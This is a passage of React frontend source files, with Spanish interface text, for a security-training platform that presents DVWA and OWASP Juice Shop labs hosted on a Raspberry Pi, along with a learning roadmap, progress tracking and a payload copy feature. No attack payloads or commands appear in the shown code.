              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="mini-lab-svg">
                <rect x="2" y="3" width="20" height="14" rx="2" />
              </svg>
            );

            return (
              <div
                key={lab.nombre}
                className="mini-lab-clickable mini-lab-pro"
                onClick={onIrALabs}
                tabIndex={0}
                role="button"
              >
                <div className="mini-lab-top">
                  <div className="mini-lab-icon-box">{icono}</div>
                  <div className="mini-lab-badges">
                    <span className="mini-lab-nivel">Nivel {lab.nivel}</span>
                    <span className="badge-estado badge-running">Disponible</span>
                  </div>
                </div>

                <span className="mini-lab-cat">{lab.categoria}</span>
                <h3>{lab.nombre}</h3>
                <p>{lab.descripcion}</p>

                <div className="mini-lab-bottom">
                  <span className="mini-lab-mod-count">
                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ marginRight: '5px' }}>
                      <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
                      <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
                    </svg>
                    {lab.modulosCount} módulos de ataque
                  </span>
                  <span className="mini-lab-cta">Entrar ahora →</span>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Características / Pilares de Aprendizaje */}
      <div className="landing-pilares">
        <div className="pilar-card">
          <div className="pilar-icon">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <line x1="12" y1="8" x2="12" y2="12" />
              <line x1="12" y1="16" x2="12.01" y2="16" />
            </svg>
          </div>
          <h4>Estructura Dónde, Cómo y Por Qué</h4>
          <p>Cada ejercicio indica exactamente en qué campo interactuar, qué comando enviar y cuál es el fallo de seguridad que lo hace posible.</p>
        </div>

        <div className="pilar-card">
          <div className="pilar-icon">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <polyline points="4 17 10 11 4 5" />
              <line x1="12" y1="19" x2="20" y2="19" />
            </svg>
          </div>
          <h4>Copiar Comandos con 1 Clic</h4>
          <p>Todos los payloads y comandos se adaptan a la IP configurada de tu Raspberry Pi y pueden copiarse al portapapeles al instante.</p>
        </div>

        <div className="pilar-card">
          <div className="pilar-icon">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
              <polyline points="22 4 12 14.01 9 11.01" />
            </svg>
          </div>
          <h4>Progreso Persistente</h4>
          <p>Tus pasos completados se guardan localmente en tu navegador sin requerir registros externos ni cuentas en la nube.</p>
        </div>
      </div>
    </div>
  );
}

export default Landing;
``

### Archivo: `frontend/src/components/GridLabs.jsx`
``javascript
import { useState, useEffect } from 'react';
import { LAB_INFO, ROADMAP } from '../data/labsInfo.js';

// Iconos representativos y vectoriales para cada laboratorio
const LAB_ICONS = {
  DVWA: (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="cuadro-lab-svg">
      <path strokeLinecap="round" strokeLinejoin="round" d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4" />
    </svg>
  ),
  'OWASP Juice Shop': (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="cuadro-lab-svg">
      <path strokeLinecap="round" strokeLinejoin="round" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M10 14h4" />
    </svg>
  ),
};

async function verificarConectividadPi(ip) {
  if (!ip) return false;
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 4000);
  try {
    await fetch(`http://${ip}/dvwa/`, { signal: controller.signal, mode: 'no-cors' });
    clearTimeout(timeoutId);
    return true;
  } catch {
    clearTimeout(timeoutId);
    return false;
  }
}

function GridLabs({ onSeleccionar, onVolver, onIrAInstalacion, ip }) {
  const [estadoPi, setEstadoPi] = useState('verificando'); // 'verificando' | 'conectada' | 'desconectada'
  const totalLabs = ROADMAP.length;

  useEffect(() => {
    if (!ip) {
      setEstadoPi('desconectada');
      return;
    }
    setEstadoPi('verificando');
    verificarConectividadPi(ip).then((conectada) => {
      setEstadoPi(conectada ? 'conectada' : 'desconectada');
    });
  }, [ip]);

  return (
    <div className="grid-labs-vista pagina-fluida">
      {/* Barra superior con botón volver */}
      <div className="pagina-top-bar">
        {onVolver && (
          <button className="btn btn-secundario btn-volver" onClick={onVolver}>
            ← Volver
          </button>
        )}
        <div className="pagina-top-info">
          <span className="etiqueta-comentario">// ENTORNOS ACTIVOS</span>
          <h1 className="pagina-top-titulo">Laboratorios de Seguridad Web</h1>
        </div>
      </div>

      {/* Tarjeta de Instalación — siempre visible y resaltada */}
      <div className="grid-instalacion-banner" onClick={onIrAInstalacion} role="button" tabIndex={0} id="card-instalacion-herramientas">
        <div className="instalacion-banner-izq">
          <div className="instalacion-banner-icono">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
              <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
          </div>
          <div className="instalacion-banner-texto">
            <div className="instalacion-banner-fase">FASE 0 · REQUISITO PREVIO</div>
            <h2 className="instalacion-banner-titulo">Instalación y Preparación de Herramientas</h2>
            <p className="instalacion-banner-desc">
              Configura tu entorno completo de trabajo antes de comenzar los laboratorios. Guía paso a paso.
            </p>
          </div>
        </div>
        <div className="instalacion-banner-der">
          <span className="instalacion-cta">Comenzar →</span>
        </div>
      </div>

      {/* Estado de la Pi */}
      {estadoPi === 'verificando' && (
        <div className="pi-estado-verificando">
          <div className="pi-spinner" />
          <span>Verificando conectividad con la Raspberry Pi{ip ? ` (${ip})` : ''}…</span>
        </div>
      )}

      {/* Labs: vacíos si Pi desconectada */}
      {estadoPi === 'desconectada' && (
        <div className="pi-desconectada-container">
          <div className="pi-desconectada-icono">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
              <path strokeLinecap="round" strokeLinejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
            </svg>
          </div>
          <h2 className="pi-desconectada-titulo">Raspberry Pi no detectada</h2>
          <p className="pi-desconectada-desc">
            {ip
              ? `No se puede alcanzar la Raspberry Pi en la dirección ${ip}. Verifica que esté encendida y conectada a la misma red.`
              : 'No hay ninguna IP de Raspberry Pi configurada. Configura la IP para acceder a los laboratorios.'}
          </p>
          <div className="pi-desconectada-labs-vacios">
            {ROADMAP.map((lab) => (
              <div key={lab.nombre} className="cuadro-lab cuadro-lab--offline">
                <div className="cuadro-lab-header">
                  <div className="cuadro-lab-icono-box offline-icono">
                    {LAB_ICONS[lab.nombre]}
                  </div>
                  <div className="cuadro-lab-tags">
                    <span className="badge-estado badge-offline">Sin conexión</span>
                  </div>
                </div>
                <div className="cuadro-lab-content">
                  <span className="cuadro-lab-cat">{lab.categoria}</span>
                  <h2 className="cuadro-lab-nombre">{lab.nombre}</h2>
                  <p className="cuadro-lab-mini offline-msg">Conecta la Raspberry Pi para acceder a este laboratorio</p>
                </div>
                <div className="cuadro-lab-footer offline-footer">
                  <span className="cuadro-modulos-count">{lab.modulosCount} módulos</span>
                  <span className="cuadro-ver-roadmap offline-cta">No disponible</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {estadoPi === 'conectada' && (
        <div className="grid-labs" style={{ '--lab-count': totalLabs }}>
          {ROADMAP.map((lab) => {
            const descripcion = LAB_INFO[lab.nombre]?.descripcion || lab.descripcion || '';
            const icono = LAB_ICONS[lab.nombre] || (
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="cuadro-lab-svg">
                <rect x="2" y="3" width="20" height="14" rx="2" />
                <line x1="8" y1="21" x2="16" y2="21" />
                <line x1="12" y1="17" x2="12" y2="21" />
              </svg>
            );

            return (
              <div
                key={lab.nombre}
                className="cuadro-lab"
                onClick={() => onSeleccionar(lab.nombre)}
                tabIndex={0}
                role="button"
              >
                <div className="cuadro-lab-header">
                  <div className="cuadro-lab-icono-box">
                    {icono}
                  </div>
                  <div className="cuadro-lab-tags">
                    <span className="badge-estado badge-running">Disponible</span>
                    <span className="cuadro-lab-nivel-badge">Nivel {lab.nivel || 1}</span>
                  </div>
                </div>

                <div className="cuadro-lab-content">
                  <span className="cuadro-lab-cat">{lab.categoria}</span>
                  <h2 className="cuadro-lab-nombre">{lab.nombre}</h2>
                  <p className="cuadro-lab-mini">{descripcion}</p>
                </div>

                <div className="cuadro-lab-footer">
                  <span className="cuadro-modulos-count">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ marginRight: '6px' }}>
                      <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
                      <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
                    </svg>
                    {lab.modulosCount} módulos
                  </span>
                  <span className="cuadro-ver-roadmap">Ver módulos →</span>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}

export default GridLabs;
``

### Archivo: `frontend/src/components/DetalleLab.jsx`
``javascript
import RoadmapLab from './RoadmapLab.jsx';

function DetalleLab({
  nombreLab,
  moduloInicialId,
  ip,
  onVolver,
  onAbrir,
}) {
  return (
    <div className="detalle-lab pagina-fluida">
      <div className="detalle-barra-superior">
        <button className="btn btn-secundario btn-volver" onClick={onVolver}>
          ← Volver a laboratorios
        </button>
      </div>

      {/* Cabecera del Laboratorio */}
      <div className="detalle-banner-control">
        <div className="banner-control-info">
          <div className="banner-top-tags">
            <span className="badge-estado badge-running">
              Disponible
            </span>
          </div>

          <h2 className="detalle-titulo">{nombreLab}</h2>
        </div>

        <div className="banner-control-acciones">
          <button
            className="btn btn-primario btn-abrir-destacado"
            onClick={() => onAbrir(nombreLab)}
          >
            Abrir laboratorio ↗
          </button>
        </div>
      </div>

      {/* Itinerario de Módulos */}
      <RoadmapLab
        nombreLab={nombreLab}
        moduloInicialId={moduloInicialId}
        ip={ip}
      />
    </div>
  );
}

export default DetalleLab;
``

### Archivo: `frontend/src/components/Roadmap.jsx`
``javascript
import { useMemo } from 'react';
import { RUTA_GLOBAL_TEMATICAS, ROADMAP_MODULOS } from '../data/roadmapsData.js';
import { obtenerPasosCompletadosModulo } from '../data/progreso.js';

// Iconos vectoriales minimalistas para cada laboratorio
const LAB_BADGE_ICONS = {
  DVWA: (
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path strokeLinecap="round" strokeLinejoin="round" d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4" />
    </svg>
  ),
  'OWASP Juice Shop': (
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path strokeLinecap="round" strokeLinejoin="round" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M10 14h4" />
    </svg>
  ),
};

// Iconos para cada fase
const FASE_ICONS = {
  terminal: (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <polyline points="4 17 10 11 4 5" />
      <line x1="12" y1="19" x2="20" y2="19" />
    </svg>
  ),
  lock: (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
    </svg>
  ),
  server: (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="2" y="2" width="20" height="8" rx="2" ry="2" />
      <rect x="2" y="14" width="20" height="8" rx="2" ry="2" />
      <line x1="6" y1="6" x2="6.01" y2="6" />
      <line x1="6" y1="18" x2="6.01" y2="18" />
    </svg>
  ),
  'shield-alert': (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
      <line x1="12" y1="8" x2="12" y2="12" />
      <line x1="12" y1="16" x2="12.01" y2="16" />
    </svg>
  ),
  setup: (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
      <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
    </svg>
  ),
};

function Roadmap({ onSeleccionarLabModulo, onSeleccionarInstalacion, onVolver }) {
  // Calcular estado de cada temática
  const tematicasConEstado = useMemo(() => {
    return RUTA_GLOBAL_TEMATICAS.map((item) => {
      const infoModulosLab = ROADMAP_MODULOS[item.lab]?.modulos || [];
      const moduloData = infoModulosLab.find((m) => m.id === item.moduloId);
      const totalPasos = moduloData?.pasos?.length || 0;
      const pasosCompletados = obtenerPasosCompletadosModulo(item.lab, item.moduloId).length;
      const completado = totalPasos > 0 && pasosCompletados >= totalPasos;

      return {
        ...item,
        totalPasos,
        pasosCompletados,
        completado,
      };
    });
  }, []);

  // Agrupación fija por fases ordenadas (Fase 1 en adelante)
  const fases = useMemo(() => {
    const grupos = {};
    tematicasConEstado
      .filter((item) => item.fase > 0)
      .forEach((item) => {
        if (!grupos[item.fase]) {
          grupos[item.fase] = {
            fase: item.fase,
            faseTitulo: item.faseTitulo,
            faseNivel: item.faseNivel,
            faseIcono: item.faseIcono,
            items: [],
          };
        }
        grupos[item.fase].items.push(item);
      });
    return Object.values(grupos);
  }, [tematicasConEstado]);

  const totalTematicas = tematicasConEstado.length;
  const completadas = tematicasConEstado.filter((t) => t.completado).length;
  const porcentaje = totalTematicas > 0 ? Math.round((completadas / totalTematicas) * 100) : 0;

  return (
    <div className="roadmap-camino-vista pagina-fluida">
      {/* Barra superior con botón volver */}
      {onVolver && (
        <div className="camino-top-bar">
          <button className="btn btn-secundario btn-volver" onClick={onVolver}>
            ← Volver
          </button>
        </div>
      )}

      {/* Encabezado Principal */}
      <div className="camino-header">
        <h1 className="camino-titulo">Roadmap General de Aprendizaje</h1>
        <p className="camino-subtitulo">
          Ruta guiada de menor a mayor nivel. Aprenderás las técnicas de seguridad paso a paso con explicaciones sencillas y ejemplos reales.
        </p>

        {/* Barra de Progreso Discreta */}
        <div className="camino-progreso-card">
          <div className="camino-progreso-top">
            <span className="camino-progreso-label">Progreso de la Ruta</span>
            <span className="camino-progreso-conteo">
              <strong>{completadas}</strong> de {totalTematicas} temáticas ({porcentaje}%)
            </span>
          </div>
          <div className="camino-barra-track">
            <div className="camino-barra-fill" style={{ width: `${porcentaje}%` }} />
          </div>
        </div>
      </div>

      {/* Camino de Fases y Pasos */}
      <div className="camino-timeline-container">

        {/* Fase 0: Instalacion — Resaltada especialmente */}
        <div className="camino-fase-seccion camino-fase-instalacion">
          <div className="camino-fase-banner fase-banner-instalacion">
            <div className="fase-banner-icon-box fase-icon-instalacion">
              {FASE_ICONS.setup}
            </div>
            <div className="fase-banner-textos">
              <h2 className="fase-banner-titulo">Fase 0 · Instalacion y Preparacion de Herramientas</h2>
              <span className="fase-banner-sub">NIVEL BASICO · OBLIGATORIO ANTES DE COMENZAR</span>
            </div>
          </div>
          <div className="camino-nodos-lista">
            <div
              className="camino-nodo-card nodo-instalacion"
              onClick={() => onSeleccionarInstalacion && onSeleccionarInstalacion()}
              tabIndex={0}
              role="button"
            >
              <div className="nodo-hito-col">
                <div className="nodo-hito-circulo circulo-instalacion">00</div>
                <div className="nodo-hito-linea" />
              </div>
              <div className="nodo-cuerpo">
                <div className="nodo-cuerpo-top">
                  <div className="nodo-badges-fila">
                    <span className="nodo-lab-badge badge-instalacion">
                      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ marginRight: '4px' }}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      </svg>
                      Configuracion Inicial
                    </span>
                    <span className="badge-nivel badge-nivel-basico">Basico</span>
                    <span className="nodo-badge-instalacion-pill">Obligatorio</span>
                  </div>
                </div>
                <h3 className="nodo-titulo">Instalacion y Preparacion de Herramientas</h3>
                <p className="nodo-descripcion">Instala VirtualBox, Kali Linux, Burp Suite, FoxyProxy e Hydra. Configura tu entorno de ataque completo para resolver todos los laboratorios. 13 pasos detallados · ~45 min</p>
              </div>
            </div>
          </div>
        </div>

        {fases.map((fase) => (
          <div key={fase.fase} className="camino-fase-seccion">
            {/* Título de la Fase */}
            <div className="camino-fase-banner">
              <div className="fase-banner-icon-box">
                {FASE_ICONS[fase.faseIcono] || FASE_ICONS.terminal}
              </div>
              <div className="fase-banner-textos">
                <h2 className="fase-banner-titulo">{fase.faseTitulo}</h2>
                <span className="fase-banner-sub">NIVEL {fase.faseNivel.toUpperCase()}</span>
              </div>
            </div>

            {/* Pasos de la Fase */}
            <div className="camino-nodos-lista">
              {fase.items.map((item) => {
                const esDvwa = item.lab === 'DVWA';

                return (
                  <div
                    key={item.id}
                    className={`camino-nodo-card ${item.completado ? 'nodo-completado' : ''}`}
                    onClick={() => onSeleccionarLabModulo && onSeleccionarLabModulo(item.lab, item.moduloId)}
                    tabIndex={0}
                    role="button"
                  >
                    {/* Indicador Numérico Conectado */}
                    <div className="nodo-hito-col">
                      <div className={`nodo-hito-circulo ${item.completado ? 'circulo-check' : ''}`}>
                        {item.completado ? '✓' : String(item.orden).padStart(2, '0')}
                      </div>
                      <div className="nodo-hito-linea" />
                    </div>

                    {/* Contenido Minimalista del Paso */}
                    <div className="nodo-cuerpo">
                      <div className="nodo-cuerpo-top">
                        <div className="nodo-badges-fila">
                          {/* Laboratorio al que pertenece */}
                          <span className={`nodo-lab-badge ${esDvwa ? 'badge-dvwa' : 'badge-juice'}`}>
                            {LAB_BADGE_ICONS[item.lab]}
                            {item.lab}
                          </span>

                          {/* Nivel al que pertenece */}
                          <span className={`badge-nivel badge-nivel-${item.nivel.toLowerCase()}`}>
                            {item.nivel}
                          </span>

                          {item.completado && (
                            <span className="nodo-badge-completado">Completado</span>
                          )}
                        </div>


                      </div>

                      <h3 className="nodo-titulo">{item.titulo}</h3>
                      <p className="nodo-descripcion">{item.descripcion}</p>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

export default Roadmap;
``

### Archivo: `frontend/src/components/RoadmapLab.jsx`
``javascript
import { useState, useMemo, useEffect } from 'react';
import { obtenerRoadmapLab } from '../data/labsInfo.js';
import {
  obtenerPasosCompletadosModulo,
  alternarPasoModulo,
  obtenerEstadisticasLab,
  esFlagPasoVerificada,
} from '../data/progreso.js';
import VerificadorFlag from './VerificadorFlag.jsx';

// Íconos SVG minimalistas por módulo (rotan automáticamente)
const ICONOS = [
  <svg key="a" viewBox="0 0 48 48" fill="none" stroke="currentColor" strokeWidth="1.75">
    <path strokeLinecap="round" d="M16 20V14a8 8 0 0 1 14-5.3" />
    <rect x="10" y="20" width="28" height="20" rx="3" />
    <circle cx="24" cy="30" r="2" fill="currentColor" />
    <path strokeLinecap="round" d="M24 32v4" />
  </svg>,
  <svg key="b" viewBox="0 0 48 48" fill="none" stroke="currentColor" strokeWidth="1.75">
    <rect x="6" y="10" width="36" height="28" rx="4" />
    <path strokeLinecap="round" d="M14 20l6 4-6 4M26 28h8" />
  </svg>,
  <svg key="c" viewBox="0 0 48 48" fill="none" stroke="currentColor" strokeWidth="1.75">
    <path strokeLinecap="round" d="M24 6L10 12v12c0 9 6 15 14 18 8-3 14-9 14-18V12L24 6z" />
    <path strokeLinecap="round" d="M18 24l4 4 8-8" />
  </svg>,
  <svg key="d" viewBox="0 0 48 48" fill="none" stroke="currentColor" strokeWidth="1.75">
    <path strokeLinecap="round" d="M6 24s6-12 18-12 18 12 18 12-6 12-18 12S6 24 6 24z" />
    <circle cx="24" cy="24" r="5" />
  </svg>,
  <svg key="e" viewBox="0 0 48 48" fill="none" stroke="currentColor" strokeWidth="1.75">
    <path strokeLinecap="round" d="M28 8H14a4 4 0 0 0-4 4v24a4 4 0 0 0 4 4h20a4 4 0 0 0 4-4V20l-10-12z" />
    <path strokeLinecap="round" d="M28 8v12h12M20 28l4-4 4 4M24 24v10" />
  </svg>,
  <svg key="f" viewBox="0 0 48 48" fill="none" stroke="currentColor" strokeWidth="1.75">
    <path strokeLinecap="round" d="M18 30l-4 4a6 6 0 0 0 8.5 8.5l4-4M30 18l4-4a6 6 0 0 0-8.5-8.5l-4 4" />
    <path strokeLinecap="round" strokeDasharray="3 3" d="M20 28l8-8" />
  </svg>,
];

function estadoMod(resueltos, total, esActivo) {
  if (total > 0 && resueltos === total) return 'completado';
  if (esActivo) return 'activo';
  return 'pendiente';
}

function renderizarTextoPaso(texto, formatearPayload) {
  if (!texto) return null;
  const textoProcesado = formatearPayload(texto);
  const lineas = textoProcesado.split('\n');

  return lineas.map((linea, idx) => {
    const trimmed = linea.trim();
    if (!trimmed) return null;

    const matchBullet = trimmed.match(/^[•\-*]\s*(.*)/);
    if (matchBullet) {
      return (
        <div key={idx} className="rl-paso-bullet-item">
          <span className="rl-bullet-dot">▸</span>
          <span className="rl-bullet-texto">{matchBullet[1]}</span>
        </div>
      );
    }

    return (
      <p key={idx} className="rl-paso-linea">
        {linea}
      </p>
    );
  });
}

function extraerDatosPaso(paso) {
  if (!paso || !paso.como) {
    return {
      objetivo: '',
      instrucciones: [{ num: 1, texto: paso?.titulo || '' }],
    };
  }

  const comoTexto = paso.como;

  // 1. Extraer misión/objetivo
  const matchObj = comoTexto.match(/Objetivo:\s*([\s\S]*?)(?=\n\s*(?:Paso a paso|¿Por qué|Por qué|Como saber|En caso de|$))/i);
  const objetivo = matchObj ? matchObj[1].trim() : '';

  // 2. Extraer instrucciones de "Paso a paso:"
  let instrucciones = [];
  const matchPasoAPaso = comoTexto.match(/Paso a paso:\s*\n([\s\S]*?)(?=\n\s*(?:¿Por qué|Por qué|Como saber|En caso de|$))/i);
  if (matchPasoAPaso) {
    const rawBloque = matchPasoAPaso[1].trim();
    const lineas = rawBloque.split('\n');
    let itemActual = null;
    lineas.forEach((linea) => {
      const matchNum = linea.match(/^\s*(\d+)\.\s+(.*)/);
      if (matchNum) {
        if (itemActual) instrucciones.push(itemActual);
        itemActual = { num: parseInt(matchNum[1], 10), texto: matchNum[2].trim() };
      } else if (itemActual) {
        itemActual.texto += '\n' + linea.trim();
      }
    });
    if (itemActual) instrucciones.push(itemActual);
  }

  if (instrucciones.length === 0) {
    instrucciones = [{ num: 1, texto: comoTexto }];
  }

  return {
    objetivo,
    instrucciones,
  };
}

function RoadmapLab({ nombreLab, moduloInicialId, ip }) {
  const dataLab = obtenerRoadmapLab(nombreLab);
  const modulos = dataLab?.modulos || [];

  const [moduloActivoId, setModuloActivoId] = useState(() => moduloInicialId || modulos[0]?.id || null);
  const [pasoActualIdx, setPasoActualIdx] = useState(0);
  const [subPasoIdx, setSubPasoIdx] = useState(0);
  const [actualizador, setActualizador] = useState(0);
  const [copiadoId, setCopiadoId] = useState(null);

  useEffect(() => {
    if (moduloInicialId) setModuloActivoId(moduloInicialId);
  }, [moduloInicialId]);

  // Al cambiar de módulo, volver al paso 0
  useEffect(() => {
    setPasoActualIdx(0);
    setSubPasoIdx(0);
  }, [moduloActivoId]);

  // Al cambiar de objetivo/tarea, volver al primer paso
  useEffect(() => {
    setSubPasoIdx(0);
  }, [pasoActualIdx]);

  // eslint-disable-next-line react-hooks/exhaustive-deps
  const stats = useMemo(() => obtenerEstadisticasLab(nombreLab, modulos), [nombreLab, modulos, actualizador]);

  const moduloActivo = useMemo(
    () => modulos.find((m) => m.id === moduloActivoId) || modulos[0] || null,
    [modulos, moduloActivoId]
  );

  // eslint-disable-next-line react-hooks/exhaustive-deps
  const pasosCompletadosActivo = useMemo(() => {
    if (!moduloActivo) return [];
    return obtenerPasosCompletadosModulo(nombreLab, moduloActivo.id);
  }, [nombreLab, moduloActivo, actualizador]);

  const togglePaso = (moduloId, pasoIdx) => {
    alternarPasoModulo(nombreLab, moduloId, pasoIdx);
    setActualizador((prev) => prev + 1);
  };

  const formatearPayload = (texto) => {
    if (!texto) return '';
    const ipVisual = ip || 'IP_PI';
    return texto.replace(/<IP_LAB>/g, ipVisual).replace(/<IP_PI>/g, ipVisual);
  };

  const copiarPayload = async (e, texto, id) => {
    e.stopPropagation();
    const textoFinal = formatearPayload(texto);
    try {
      await navigator.clipboard.writeText(textoFinal);
      setCopiadoId(id);
      setTimeout(() => setCopiadoId(null), 2000);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = textoFinal;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopiadoId(id);
      setTimeout(() => setCopiadoId(null), 2000);
    }
  };

  const indiceActual = modulos.findIndex((m) => m.id === moduloActivo?.id);
  const moduloAnterior = indiceActual > 0 ? modulos[indiceActual - 1] : null;
  const moduloSiguiente = indiceActual < modulos.length - 1 ? modulos[indiceActual + 1] : null;
  const totalPasos = moduloActivo?.pasos?.length || 0;
  const porcentaje = totalPasos > 0 ? Math.round((pasosCompletadosActivo.length / totalPasos) * 100) : 0;

  // Paso que se muestra actualmente
  const pasoActual = moduloActivo?.pasos?.[pasoActualIdx] || null;
  const pasoId = pasoActual ? `${moduloActivo.id}-p-${pasoActualIdx}` : null;
  const pasoCompletado = pasosCompletadosActivo.includes(pasoActualIdx);
  const copiado = copiadoId === pasoId;

  // Flag del paso actual ya verificada
  // eslint-disable-next-line react-hooks/exhaustive-deps
  const flagPasoOk = useMemo(() =>
    moduloActivo ? esFlagPasoVerificada(nombreLab, moduloActivo.id, pasoActualIdx) : false,
    [nombreLab, moduloActivo, pasoActualIdx, actualizador]
  );

  // Extraer datos del paso actual (objetivo e instrucciones independientes)
  const datosPasoActual = useMemo(() => {
    return extraerDatosPaso(pasoActual);
  }, [pasoActual]);

  const totalSubPasos = datosPasoActual.instrucciones.length;
  const subPasoActual = datosPasoActual.instrucciones[subPasoIdx] || datosPasoActual.instrucciones[0];
  const esUltimoSubPaso = subPasoIdx === totalSubPasos - 1;

  const irSubPasoAnterior = () => {
    if (subPasoIdx > 0) {
      setSubPasoIdx((i) => i - 1);
    } else if (pasoActualIdx > 0) {
      const prevPaso = moduloActivo?.pasos?.[pasoActualIdx - 1];
      const prevDatos = extraerDatosPaso(prevPaso);
      setPasoActualIdx((p) => p - 1);
      setSubPasoIdx(Math.max(0, prevDatos.instrucciones.length - 1));
    }
  };

  const irSubPasoSiguiente = () => {
    if (subPasoIdx < totalSubPasos - 1) {
      setSubPasoIdx((i) => i + 1);
    }
  };

  const marcarYAvanzarObjetivo = () => {
    if (!pasoCompletado) {
